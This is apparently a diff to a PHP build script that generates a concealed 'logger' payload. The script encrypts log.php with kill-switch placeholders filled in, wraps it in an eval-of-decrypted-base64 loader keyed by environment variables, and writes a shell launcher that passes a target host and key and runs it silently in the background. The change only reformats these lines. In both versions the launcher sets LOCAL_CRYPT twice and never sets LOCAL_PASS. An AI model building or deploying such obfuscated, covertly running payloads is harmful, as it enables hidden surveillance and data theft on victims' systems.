@@ -50,11 +50,31 @@ if (!is_dir(__DIR__.'/dist/home')) {
 
 file_put_contents(
     __DIR__."/dist/source/$logger.php",
-    "<?php eval(openssl_decrypt(base64_decode('".openssl_encrypt(substr(str_replace(['##KILLKEY##', '##KILLNAME##'], [$killkey, $killName], file_get_contents('log.php')), 5), $crypt, $pass, 0, $iv)."'), getenv('LOCAL_CRYPT'), getenv('LOCAL_PASS'), OPENSSL_RAW_DATA, getenv('LOCAL_IV')));"
+    "<?php eval(openssl_decrypt(base64_decode("
+        . "'".openssl_encrypt(
+            substr(
+                str_replace(
+                    ['##KILLKEY##', '##KILLNAME##'],
+                    [$killkey, $killName],
+                    file_get_contents('log.php')
+                ),
+            5),
+            $crypt,
+            $pass,
+            0,
+            $iv
+        )."'), getenv('LOCAL_CRYPT'), getenv('LOCAL_PASS'), OPENSSL_RAW_DATA, getenv('LOCAL_IV')));"
 );
 file_put_contents(
     __DIR__."/dist/source/$logger.sh",
-    "TARGET_API=$api TARGET_PROTOCOL=$protocol TARGET_HOST=$target TARGET_KEY=$key LOCAL_CRYPT=$crypt LOCAL_IV=$iv LOCAL_CRYPT=$crypt php $logger.php &>/dev/null &"
+    "TARGET_API=$api "
+    . "TARGET_PROTOCOL=$protocol "
+    . "TARGET_HOST=$target "
+    . "TARGET_KEY=$key "
+    . "LOCAL_CRYPT=$crypt "
+    . "LOCAL_IV=$iv "
+    . "LOCAL_CRYPT=$crypt "
+    . "php $logger.php &>/dev/null &"
 );
 file_put_contents(
     __DIR__."/dist/target/$api.php",
